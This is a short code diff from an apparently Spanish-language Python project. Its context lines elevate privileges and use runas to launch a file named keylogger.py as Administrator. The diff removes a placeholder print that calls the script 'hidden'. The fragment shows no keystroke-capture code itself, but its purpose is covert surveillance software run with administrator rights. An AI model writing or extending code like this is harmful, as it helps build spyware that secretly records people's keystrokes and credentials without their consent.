@@ -37,8 +37,6 @@ run_as_admin()
 
 subprocess.run(["runas", "/user:Administrator", "python", "keylogger.py"])
 
-# El código de tu script aquí
-print("Hola, este es mi script oculto.")
 #Funcion que comprueba si una dependencia esta instalada
 def is_dependency_installed(dependency_name):
     try:
